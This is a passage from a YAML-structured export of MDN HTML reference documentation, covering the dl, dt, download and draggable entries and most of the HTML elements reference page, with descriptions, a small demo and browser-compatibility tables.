Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dl` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<dt>`](dt)\n- [`<dd>`](dd)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dl](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dl)"
- name: download (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`download`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/download)

    [`<a>`](element/a), [`<area>`](element/area)

    Indicates that the hyperlink is to be used for downloading a resource.
- name: draggable (attribute)
  summary: The draggable global attribute is an enumerated attribute that indicates whether the element can be dragged, either with native browser behavior or the HTML Drag and Drop API
  description: "# draggable\n\nThe `draggable` [global attribute](../global_attributes) is an [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) attribute that indicates whether the element can be dragged, either with native browser behavior or the [HTML Drag and Drop API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API).\n\nThe `draggable` attribute may be applied to elements that strictly fall under the [HTML namespace](https://developer.mozilla.org/en-US/docs/Glossary/Namespace), which means that it cannot be applied to [SVGs](https://developer.mozilla.org/en-US/docs/Web/SVG). For more information about what namespace declarations look like, and what they do, see [Namespace crash course](https://developer.mozilla.org/en-US/docs/Web/SVG/Namespaces_Crash_Course).\n\n`draggable` can have the following values:\n\n- `true`: the element can be dragged.\n- `false`: the element cannot be dragged.\n\n**Warning:** This attribute is *[enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated)* and not *Boolean*. A value of `true` or `false` is mandatory, and shorthand like `<img draggable>` is forbidden. The correct usage is `<img draggable=\"false\">`.\n\nIf this attribute is not set, its default value is `auto`, which means drag behavior is the default browser behavior: only text selections, images, and links can be dragged. For other elements, the event [`ondragstart`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/dragstart_event) must be set for drag and drop to work, as shown in this [comprehensive example](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Drag_and_Drop_API/Drag_operations).\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|             | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|             | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `draggable` | 4       | 12   | 2       | 12    | 5      | 18             | 4                   | 14            | 4.2           | 1.0              | 4.4             |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/draggable](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/draggable)"
- name: dt
  summary: The <dt> HTML element specifies a term in a description or definition list, and as such must be used inside a <dl> element
  description: "# \\<dt\\>: The Description Term element\n\nThe `<dt>` [HTML](../index) element specifies a term in a description or definition list, and as such must be used inside a [`<dl>`](dl) element. It is usually followed by a [`<dd>`](dd) element; however, multiple `<dt>` elements in a row indicate several terms that are all defined by the immediate next [`<dd>`](dd) element.\n\nThe subsequent [`<dd>`](dd) (**Description Details**) element provides the definition or other related text associated with the term specified using `<dt>`.\n\n## Try it\n\n#### HTML Demo: \\<dt\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Please use the following paint colors for the new house:</p>\n\n    <dl>\n      <dt>Denim (semigloss finish)</dt>\n      <dd>Ceiling</dd>\n\n      <dt>Denim (eggshell finish)</dt>\n      <dt>Evening Sky (eggshell finish)</dt>\n      <dd>Layered on the walls</dd>\n    </dl>\n\n    p,\n    dl {\n      font:\n        1rem 'Fira Sans',\n        sans-serif;\n    }\n\n    dl > dt {\n      font-weight: normal;\n      font-style: oblique;\n    }\n\n    dd {\n      margin-bottom: 1rem;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\nFor examples, see the [examples provided for the `<dl>` element](dl#examples).\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|      | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|      | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `dt` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<dl>`](dl)\n- [`<dd>`](dd)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dt](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/dt)"
- name: Element
  summary: This page lists all the HTML elements, which are created using tags
  description: "# HTML elements reference\n\nThis page lists all the [HTML](https://developer.mozilla.org/en-US/docs/Glossary/HTML) [elements](https://developer.mozilla.org/en-US/docs/Glossary/Element), which are created using [tags](https://developer.mozilla.org/en-US/docs/Glossary/Tag).\n\nThey are grouped by function to help you find what you have in mind easily. An alphabetical list of all elements is provided in the sidebar on every element's page as well as this one.\n\n**Note:** For more information about the basics of HTML elements and attributes, see [the section on elements in the Introduction to HTML article](https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Getting_started#anatomy_of_an_html_element).\n\n## Main root\n\n| Element                  | Description                                                                                                                                                           |\n|--------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<html>`](element/html) | Represents the root (top-level element) of an HTML document, so it is also referred to as the *root element*. All other elements must be descendants of this element. |\n\n## Document metadata\n\nMetadata contains information about the page. This includes information about styles, scripts and data to help software ([search engines](https://developer.mozilla.org/en-US/docs/Glossary/Search_engine), [browsers](https://developer.mozilla.org/en-US/docs/Glossary/Browser), etc.) use and render the page. Metadata for styles and scripts may be defined in the page or linked to another file that has the information.\n\n| Element                    | Description                                                                                                                                                                                                                                                                                         |\n|----------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<base>`](element/base)   | Specifies the base URL to use for all relative URLs in a document. There can be only one such element in a document.                                                                                                                                                                                |\n| [`<head>`](element/head)   | Contains machine-readable information (metadata) about the document, like its [title](element/title), [scripts](element/script), and [style sheets](element/style).                                                                                                                                 |\n| [`<link>`](element/link)   | Specifies relationships between the current document and an external resource. This element is most commonly used to link to CSS but is also used to establish site icons (both \"favicon\" style icons and icons for the home screen and apps on mobile devices) among other things.                 |\n| [`<meta>`](element/meta)   | Represents [metadata](https://developer.mozilla.org/en-US/docs/Glossary/Metadata) that cannot be represented by other HTML meta-related elements, like [`<base>`](element/base), [`<link>`](element/link), [`<script>`](element/script), [`<style>`](element/style) and [`<title>`](element/title). |\n| [`<style>`](element/style) | Contains style information for a document or part of a document. It contains CSS, which is applied to the contents of the document containing this element.                                                                                                                                         |\n| [`<title>`](element/title) | Defines the document's title that is shown in a [browser](https://developer.mozilla.org/en-US/docs/Glossary/Browser)'s title bar or a page's tab. It only contains text; tags within the element are ignored.                                                                                       |\n\n## Sectioning root\n\n| Element                  | Description                                                                                   |\n|--------------------------|-----------------------------------------------------------------------------------------------|\n| [`<body>`](element/body) | represents the content of an HTML document. There can be only one such element in a document. |\n\n## Content sectioning\n\nContent sectioning elements allow you to organize the document content into logical pieces. Use the sectioning elements to create a broad outline for your page content, including header and footer navigation, and heading elements to identify sections of content.\n\n| Element                                                                                                                                                                                                                | Description                                                                                                                                                                                                                                                                                                                                                                   |\n|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<address>`](element/address)                                                                                                                                                                                         | Indicates that the enclosed HTML provides contact information for a person or people, or for an organization.                                                                                                                                                                                                                                                                 |\n| [`<article>`](element/article)                                                                                                                                                                                         | Represents a self-contained composition in a document, page, application, or site, which is intended to be independently distributable or reusable (e.g., in syndication). Examples include a forum post, a magazine or newspaper article, a blog entry, a product card, a user-submitted comment, an interactive widget or gadget, or any other independent item of content. |\n| [`<aside>`](element/aside)                                                                                                                                                                                             | Represents a portion of a document whose content is only indirectly related to the document's main content. Asides are frequently presented as sidebars or call-out boxes.                                                                                                                                                                                                    |\n| [`<footer>`](element/footer)                                                                                                                                                                                           | Represents a footer for its nearest ancestor [sectioning content](content_categories#sectioning_content) or [sectioning root](element/heading_elements) element. A `<footer>` typically contains information about the author of the section, copyright data, or links to related documents.                                                                                  |\n| [`<header>`](element/header)                                                                                                                                                                                           | Represents introductory content, typically a group of introductory or navigational aids. It may contain some heading elements but also a logo, a search form, an author name, and other elements.                                                                                                                                                                             |\n| [`<h1>`](element/heading_elements), [`<h2>`](element/heading_elements), [`<h3>`](element/heading_elements), [`<h4>`](element/heading_elements), [`<h5>`](element/heading_elements), [`<h6>`](element/heading_elements) | Represent six levels of section headings. `<h1>` is the highest section level and `<h6>` is the lowest.                                                                                                                                                                                                                                                                       |\n| [`<hgroup>`](element/hgroup)                                                                                                                                                                                           | Represents a heading grouped with any secondary content, such as subheadings, an alternative title, or a tagline.                                                                                                                                                                                                                                                             |\n| [`<main>`](element/main)                                                                                                                                                                                               | Represents the dominant content of the body of a document. The main content area consists of content that is directly related to or expands upon the central topic of a document, or the central functionality of an application.                                                                                                                                             |\n| [`<nav>`](element/nav)                                                                                                                                                                                                 | Represents a section of a page whose purpose is to provide navigation links, either within the current document or to other documents. Common examples of navigation sections are menus, tables of contents, and indexes.                                                                                                                                                     |\n| [`<section>`](element/section)                                                                                                                                                                                         | Represents a generic standalone section of a document, which doesn't have a more specific semantic element to represent it. Sections should always have a heading, with very few exceptions.                                                                                                                                                                                  |\n| [`<search>`](element/search)                                                                                                                                                                                           | Represents a part that contains a set of form controls or other content related to performing a search or filtering operation.                                                                                                                                                                                                                                                |\n\n## Text content\n\nUse HTML text content elements to organize blocks or sections of content placed between the opening [`<body>`](element/body) and closing `</body>` tags. Important for [accessibility](https://developer.mozilla.org/en-US/docs/Glossary/Accessibility) and [SEO](https://developer.mozilla.org/en-US/docs/Glossary/SEO), these elements identify the purpose or structure of that content.\n\n| Element                              | Description                                                                                                                                                                                                                                                                                                                                                                                         |\n|--------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<blockquote>`](element/blockquote) | Indicates that the enclosed text is an extended quotation. Usually, this is rendered visually by indentation. A URL for the source of the quotation may be given using the `cite` attribute, while a text representation of the source can be given using the [`<cite>`](element/cite) element.                                                                                                     |\n| [`<dd>`](element/dd)                 | Provides the description, definition, or value for the preceding term ([`<dt>`](element/dt)) in a description list ([`<dl>`](element/dl)).                                                                                                                                                                                                                                                          |\n| [`<div>`](element/div)               | The generic container for flow content. It has no effect on the content or layout until styled in some way using CSS (e.g., styling is directly applied to it, or some kind of layout model like [flexbox](https://developer.mozilla.org/en-US/docs/Glossary/Flexbox) is applied to its parent element).                                                                                            |\n| [`<dl>`](element/dl)                 | Represents a description list. The element encloses a list of groups of terms (specified using the [`<dt>`](element/dt) element) and descriptions (provided by [`<dd>`](element/dd) elements). Common uses for this element are to implement a glossary or to display metadata (a list of key-value pairs).                                                                                         |\n| [`<dt>`](element/dt)                 | Specifies a term in a description or definition list, and as such must be used inside a [`<dl>`](element/dl) element. It is usually followed by a [`<dd>`](element/dd) element; however, multiple `<dt>` elements in a row indicate several terms that are all defined by the immediate next [`<dd>`](element/dd) element.                                                                          |\n| [`<figcaption>`](element/figcaption) | Represents a caption or legend describing the rest of the contents of its parent [`<figure>`](element/figure) element.                                                                                                                                                                                                                                                                              |\n| [`<figure>`](element/figure)         | Represents self-contained content, potentially with an optional caption, which is specified using the [`<figcaption>`](element/figcaption) element. The figure, its caption, and its contents are referenced as a single unit.                                                                                                                                                                      |\n| [`<hr>`](element/hr)                 | Represents a thematic break between paragraph-level elements: for example, a change of scene in a story, or a shift of topic within a section.                                                                                                                                                                                                                                                      |\n| [`<li>`](element/li)                 | Represents an item in a list. It must be contained in a parent element: an ordered list ([`<ol>`](element/ol)), an unordered list ([`<ul>`](element/ul)), or a menu ([`<menu>`](element/menu)). In menus and unordered lists, list items are usually displayed using bullet points. In ordered lists, they are usually displayed with an ascending counter on the left, such as a number or letter. |\n| [`<menu>`](element/menu)             | A semantic alternative to [`<ul>`](element/ul), but treated by browsers (and exposed through the accessibility tree) as no different than [`<ul>`](element/ul). It represents an unordered list of items (which are represented by [`<li>`](element/li) elements).                                                                                                                                  |\n| [`<ol>`](element/ol)                 | Represents an ordered list of items — typically rendered as a numbered list.                                                                                                                                                                                                                                                                                                                        |\n| [`<p>`](element/p)                   | Represents a paragraph. Paragraphs are usually represented in visual media as blocks of text separated from adjacent blocks by blank lines and/or first-line indentation, but HTML paragraphs can be any structural grouping of related content, such as images or form fields.                                                                                                                     |\n| [`<pre>`](element/pre)               | Represents preformatted text which is to be presented exactly as written in the HTML file. The text is typically rendered using a non-proportional, or [monospaced](https://en.wikipedia.org/wiki/Monospaced_font), font. Whitespace inside this element is displayed as written.                                                                                                                   |\n| [`<ul>`](element/ul)                 | Represents an unordered list of items, typically rendered as a bulleted list.                                                                                                                                                                                                                                                                                                                       |\n\n## Inline text semantics\n\nUse the HTML inline text semantic to define the meaning, structure, or style of a word, line, or any arbitrary piece of text.\n\n| Element                      | Description|\n|------------------------------||\n| [`<a>`](element/a)           | Together with its `href` attribute, creates a hyperlink to web pages, files, email addresses, locations within the current page, or anything else a URL can address.                                                                                                                                                                                                                                                                                                                                                                                                                                    |\n| [`<abbr>`](element/abbr)     | Represents an abbreviation or acronym|\n| [`<b>`](element/b)           | Used to draw the reader's attention to the element's contents, which are not otherwise granted special importance. This was formerly known as the Boldface element, and most browsers still draw the text in boldface. However, you should not use `<b>` for styling text or granting importance. If you wish to create boldface text, you should use the CSS [`font-weight`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-weight) property. If you wish to indicate an element is of special importance, you should use the strong element.                                                   |\n| [`<bdi>`](element/bdi)       | Tells the browser's bidirectional algorithm to treat the text it contains in isolation from its surrounding text. It's particularly useful when a website dynamically inserts some text and doesn't know the directionality of the text being inserted.                                                                                                                                                                                                                                                                                                                                                 |\n| [`<bdo>`](element/bdo)       | Overrides the current directionality of text, so that the text within is rendered in a different direction.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |\n| [`<br>`](element/br)         | Produces a line break in text (carriage-return). It is useful for writing a poem or an address, where the division of lines is significant.                                                                                                                                                                                                                                                                                                                                                                                                                                                             |\n| [`<cite>`](element/cite)     | Used to mark up the title of a cited creative work. The reference may be in an abbreviated form according to context-appropriate conventions related to citation metadata.                                                                                                                                                                                                                                                                                                                                                                                                                              |\n| [`<code>`](element/code)     | Displays its contents styled in a fashion intended to indicate that the text is a short fragment of computer code. By default, the content text is displayed using the user agent's default monospace font.                                                                                                                                                                                                                                                                                                                                                                                             |\n| [`<data>`](element/data)     | Links a given piece of content with a machine-readable translation. If the content is time- or date-related, the `<time>` element must be used.                                                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| [`<dfn>`](element/dfn)       | Used to indicate the term being defined within the context of a definition phrase or sentence. The ancestor [`<p>`](element/p) element, the [`<dt>`](element/dt)/[`<dd>`](element/dd) pairing, or the nearest section ancestor of the `<dfn>` element, is considered to be the definition of the term.                                                                                                                                                                                                                                                                                                  |\n| [`<em>`](element/em)         | Marks text that has stress emphasis. The `<em>` element can be nested, with each nesting level indicating a greater degree of emphasis.                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |\n| [`<i>`](element/i)           | Represents a range of text that is set off from the normal text for some reason, such as idiomatic text, technical terms, and taxonomical designations, among others. Historically, these have been presented using italicized type, which is the original source of the `<i>` naming of this element.                                                                                                                                                                                                                                                                                                  |\n| [`<kbd>`](element/kbd)       | Represents a span of inline text denoting textual user input from a keyboard, voice input, or any other text entry device. By convention, the user agent defaults to rendering the contents of a `<kbd>` element using its default monospace font, although this is not mandated by the HTML standard.                                                                                                                                                                                                                                                                                                  |\n| [`<mark>`](element/mark)     | Represents text which is marked or highlighted for reference or notation purposes due to the marked passage's relevance in the enclosing context.                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| [`<q>`](element/q)           | Indicates that the enclosed text is a short inline quotation. Most modern browsers implement this by surrounding the text in quotation marks. This element is intended for short quotations that don't require paragraph breaks; for long quotations use the [`<blockquote>`](element/blockquote) element.                                                                                                                                                                                                                                                                                              |\n| [`<rp>`](element/rp)         | Used to provide fall-back parentheses for browsers that do not support the display of ruby annotations using the [`<ruby>`](element/ruby) element. One `<rp>` element should enclose each of the opening and closing parentheses that wrap the [`<rt>`](element/rt) element that contains the annotation's text.                                                                                                                                                                                                                                                                                        |\n| [`<rt>`](element/rt)         | Specifies the ruby text component of a ruby annotation, which is used to provide pronunciation, translation, or transliteration information for East Asian typography. The `<rt>` element must always be contained within a [`<ruby>`](element/ruby) element.                                                                                                                                                                                                                                                                                                                                           |\n| [`<ruby>`](element/ruby)     | Represents small annotations that are rendered above, below, or next to base text, usually used for showing the pronunciation of East Asian characters. It can also be used for annotating other kinds of text, but this usage is less common.                                                                                                                                                                                                                                                                                                                                                          |\n| [`<s>`](element/s)           | Renders text with a strikethrough, or a line through it. Use the `<s>` element to represent things that are no longer relevant or no longer accurate. However, `<s>` is not appropriate when indicating document edits; for that, use the [`<del>`](element/del) and [`<ins>`](element/ins) elements, as appropriate.                                                                                                                                                                                                                                                                                   |\n| [`<samp>`](element/samp)     | Used to enclose inline text which represents sample (or quoted) output from a computer program. Its contents are typically rendered using the browser's default monospaced font (such as [Courier](https://en.wikipedia.org/wiki/Courier_(typeface)) or Lucida Console).                                                                                                                                                                                                                                                                                                                                |\n| [`<small>`](element/small)   | Represents side-comments and small print, like copyright and legal text, independent of its styled presentation. By default, it renders text within it one font size smaller, such as from `small` to `x-small`.                                                                                                                                                                                                                                                                                                                                                                                        |\n| [`<span>`](element/span)     | A generic inline container for phrasing content, which does not inherently represent anything. It can be used to group elements for styling purposes (using the `class` or `id` attributes), or because they share attribute values, such as `lang`. It should be used only when no other semantic element is appropriate. `<span>` is very much like a div element, but div is a [block-level element](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) whereas a `<span>` is an [inline-level element](https://developer.mozilla.org/en-US/docs/Glossary/Inline-level_content). |\n| [`<strong>`](element/strong) | Indicates that its contents have strong importance, seriousness, or urgency. Browsers typically render the contents in bold type.                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |\n| [`<sub>`](element/sub)       | Specifies inline text which should be displayed as subscript for solely typographical reasons. Subscripts are typically rendered with a lowered baseline using smaller text.                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| [`<sup>`](element/sup)       | Specifies inline text which is to be displayed as superscript for solely typographical reasons. Superscripts are usually rendered with a raised baseline using smaller text.                                                                                                                                                                                                                                                                                                                                                                                                                            |\n| [`<time>`](element/time)     | Represents a specific period in time. It may include the `datetime` attribute to translate dates into machine-readable format, allowing for better search engine results or custom features such as reminders.                                                                                                                                                                                                                                                                                                                                                                                          |\n| [`<u>`](element/u)           | Represents a span of inline text which should be rendered in a way that indicates that it has a non-textual annotation. This is rendered by default as a simple solid underline but may be altered using CSS.                                                                                                                                                                                                                                                                                                                                                                                           |\n| [`<var>`](element/var)       | Represents the name of a variable in a mathematical expression or a programming context. It's typically presented using an italicized version of the current typeface, although that behavior is browser-dependent.                                                                                                                                                                                                                                                                                                                                                                                     |\n| [`<wbr>`](element/wbr)       | Represents a word break opportunity—a position within text where the browser may optionally break a line, though its line-breaking rules would not otherwise create a break at that location.                                                                                                                                                                                                                                                                                                                                                                                                           |\n\n## Image and multimedia\n\nHTML supports various multimedia resources such as images, audio, and video.\n\n| Element                    | Description                                                                                                                                                                                                                                                                                                                               |\n|----------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<area>`](element/area)   | Defines an area inside an image map that has predefined clickable areas. An *image map* allows geometric areas on an image to be associated with [hyperlink](https://developer.mozilla.org/en-US/docs/Glossary/Hyperlink).                                                                                                                |\n| [`<audio>`](element/audio) | Used to embed sound content in documents. It may contain one or more audio sources, represented using the `src` attribute or the source element: the browser will choose the most suitable one. It can also be the destination for streamed media, using a [`MediaStream`](https://developer.mozilla.org/en-US/docs/Web/API/MediaStream). |\n| [`<img>`](element/img)     | Embeds an image into the document.                                                                                                                                                                                                                                                                                                        |\n| [`<map>`](element/map)     | Used with [`<area>`](element/area) elements to define an image map (a clickable link area).                                                                                                                                                                                                                                               |\n| [`<track>`](element/track) | Used as a child of the media elements, audio and video. It lets you specify timed text tracks (or time-based data), for example to automatically handle subtitles. The tracks are formatted in [WebVTT format](https://developer.mozilla.org/en-US/docs/Web/API/WebVTT_API) (`.vtt` files)—Web Video Text Tracks.                         |\n| [`<video>`](element/video) | Embeds a media player which supports video playback into the document. You can also use `<video>` for audio content, but the audio element may provide a more appropriate user experience.                                                                                                                                                |\n\n## Embedded content\n\nIn addition to regular multimedia content, HTML can include a variety of other content, even if it's not always easy to interact with.\n\n| Element                        | Description|\n|--------------------------------||\n| [`<embed>`](element/embed)     | Embeds external content at the specified point in the document. This content is provided by an external application or other source of interactive content such as a browser plug-in.                                                                                                                                                                                                                                                                                                                                                                 |\n| [`<iframe>`](element/iframe)   | Represents a nested browsing context, embedding another HTML page into the current one.                                                                                                                                                                                                                                                                                                                                                                                                                                                               |\n| [`<object>`](element/object)   | Represents an external resource, which can be treated as an image, a nested browsing context, or a resource to be handled by a plugin.                                                                                                                                                                                                                                                                                                                                                                                                                |\n| [`<picture>`](element/picture) | Contains zero or more [`<source>`](element/source) elements and one [`<img>`](element/img) element to offer alternative versions of an image for different display/device scenarios.                                                                                                                                                                                                                                                                                                                                                                  |\n| [`<portal>`](element/portal)   | Enables the embedding of another HTML page into the current one to enable smoother navigation into new pages.                                                                                                                                                                                                                                                                                                                                                                                                                                         |\n| [`<source>`](element/source)   | Specifies multiple media resources for the picture, the audio element, or the video element. It is a void element, meaning that it has no content and does not have a closing tag. It is commonly used to offer the same media content in multiple file formats in order to provide compatibility with a broad range of browsers given their differing support for [image file formats](https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Image_types) and [media file formats](https://developer.mozilla.org/en-US/docs/Web/Media/Formats). |\n\n## SVG and MathML\n\nYou can embed [SVG](https://developer.mozilla.org/en-US/docs/Web/SVG) and [MathML](https://developer.mozilla.org/en-US/docs/Web/MathML) content directly into HTML documents, using the [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg) and [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math) elements.\n\n| Element                                                                      | Description                                                                                                                                                                                                                                                           |\n|------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<svg>`](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/svg)      | Container defining a new coordinate system and [viewport](https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/viewBox). It is used as the outermost element of SVG documents, but it can also be used to embed an SVG fragment inside an SVG or HTML document. |\n| [`<math>`](https://developer.mozilla.org/en-US/docs/Web/MathML/Element/math) | The top-level element in MathML. Every valid MathML instance must be wrapped in it. In addition, you must not nest a second `<math>` element in another, but you can have an arbitrary number of other child elements in it.                                          |\n\n## Scripting\n\nTo create dynamic content and Web applications, HTML supports the use of scripting languages, most prominently JavaScript. Certain elements support this capability.\n\n| Element                          | Description                                                                                                                                                                                                                                                                                                                                          |\n|----------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<canvas>`](element/canvas)     | Container element to use with either the [canvas scripting API](https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API) or the [WebGL API](https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API) to draw graphics and animations.                                                                                                         |\n| [`<noscript>`](element/noscript) | Defines a section of HTML to be inserted if a script type on the page is unsupported or if scripting is currently turned off in the browser.                                                                                                                                                                                                         |\n| [`<script>`](element/script)     | Used to embed executable code or data; this is typically used to embed or refer to JavaScript code. The `<script>` element can also be used with other languages, such as [WebGL](https://developer.mozilla.org/en-US/docs/Web/API/WebGL_API)'s GLSL shader programming language and [JSON](https://developer.mozilla.org/en-US/docs/Glossary/JSON). |\n\n## Demarcating edits\n\nThese elements let you provide indications that specific parts of the text have been altered.\n\n| Element                | Description                                                                                                                                                                                                                                                                     |\n|------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<del>`](element/del) | Represents a range of text that has been deleted from a document. This can be used when rendering \"track changes\" or source code diff information, for example. The `<ins>` element can be used for the opposite purpose: to indicate text that has been added to the document. |\n| [`<ins>`](element/ins) | Represents a range of text that has been added to a document. You can use the `<del>` element to similarly represent a range of text that has been deleted from the document.                                                                                                   |\n\n## Table content\n\nThe elements here are used to create and handle tabular data.\n\n| Element                          | Description                                                                                                                                                                                                                                                                                      |\n|----------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<caption>`](element/caption)   | Specifies the caption (or title) of a table.                                                                                                                                                                                                                                                     |\n| [`<col>`](element/col)           | Defines one or more columns in a column group represented by its implicit or explicit parent [`<colgroup>`](element/colgroup) element. The `<col>` element is only valid as a child of a [`<colgroup>`](element/colgroup) element that has no [`span`](element/colgroup#span) attribute defined. |\n| [`<colgroup>`](element/colgroup) | Defines a group of columns within a table.                                                                                                                                                                                                                                                       |\n| [`<table>`](element/table)       | Represents tabular data—that is, information presented in a two-dimensional table comprised of rows and columns of cells containing data.                                                                                                                                                        |\n| [`<tbody>`](element/tbody)       | Encapsulates a set of table rows ([`<tr>`](element/tr) elements), indicating that they comprise the body of a table's (main) data.                                                                                                                                                               |\n| [`<td>`](element/td)             | A child of the [`<tr>`](element/tr) element, it defines a cell of a table that contains data.                                                                                                                                                                                                    |\n| [`<tfoot>`](element/tfoot)       | Encapsulates a set of table rows ([`<tr>`](element/tr) elements), indicating that they comprise the foot of a table with information about the table's columns. This is usually a summary of the columns, e.g., a sum of the given numbers in a column.                                          |\n| [`<th>`](element/th)             | A child of the [`<tr>`](element/tr) element, it defines a cell as the header of a group of table cells. The nature of this group can be explicitly defined by the [`scope`](element/th#scope) and [`headers`](element/th#headers) attributes.                                                    |\n| [`<thead>`](element/thead)       | Encapsulates a set of table rows ([`<tr>`](element/tr) elements), indicating that they comprise the head of a table with information about the table's columns. This is usually in the form of column headers ([`<th>`](element/th) elements).                                                   |\n| [`<tr>`](element/tr)             | Defines a row of cells in a table. The row's cells can then be established using a mix of [`<td>`](element/td) (data cell) and [`<th>`](element/th) (header cell) elements.                                                                                                                      |\n\n## Forms\n\nHTML provides several elements that can be used together to create forms that the user can fill out and submit to the website or application. Further information about this available in the [HTML forms guide](https://developer.mozilla.org/en-US/docs/Learn/Forms).\n\n| Element                          | Description                                                                                                                                                                                                                                                                                                                                                |\n|----------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [`<button>`](element/button)     | An interactive element activated by a user with a mouse, keyboard, finger, voice command, or other assistive technology. Once activated, it performs an action, such as submitting a [form](https://developer.mozilla.org/en-US/docs/Learn/Forms) or opening a dialog.                                                                                     |\n| [`<datalist>`](element/datalist) | Contains a set of [`<option>`](element/option) elements that represent the permissible or recommended options available to choose from within other controls.                                                                                                                                                                                              |\n| [`<fieldset>`](element/fieldset) | Used to group several controls as well as labels ([`<label>`](element/label)) within a web form.                                                                                                                                                                                                                                                           |\n| [`<form>`](element/form)         | Represents a document section containing interactive controls for submitting information.                                                                                                                                                                                                                                                                  |\n| [`<input>`](element/input)       | Used to create interactive controls for web-based forms to accept data from the user; a wide variety of types of input data and control widgets are available, depending on the device and user agent. The `<input>` element is one of the most powerful and complex in all of HTML due to the sheer number of combinations of input types and attributes. |\n| [`<label>`](element/label)       | Represents a caption for an item in a user interface.                                                                                                                                                                                                                                                                                                      |\n| [`<legend>`](element/legend)     | Represents a caption for the content of its parent [`<fieldset>`](element/fieldset).                                                                                                                                                                                                                                                                       |\n| [`<meter>`](element/meter)       | Represents either a scalar value within a known range or a fractional value.                                                                                                                                                                                                                                                                               |\n| [`<optgroup>`](element/optgroup) | Creates a grouping of options within a [`<select>`](element/select) element.                                                                                                                                                                                                                                                                               |\n| [`<option>`](element/option)     | Used to define an item contained in a select, an [`<optgroup>`](element/optgroup), or a [`<datalist>`](element/datalist) element. As such, `<option>` can represent menu items in popups and other lists of items in an HTML document.                                                                                                                     |\n| [`<output>`](element/output)     | Container element into which a site or app can inject the results of a calculation or the outcome of a user action.                                                                                                                                                                                                                                        |\n| [`<progress>`](element/progress) | Displays an indicator showing the completion progress of a task, typically displayed as 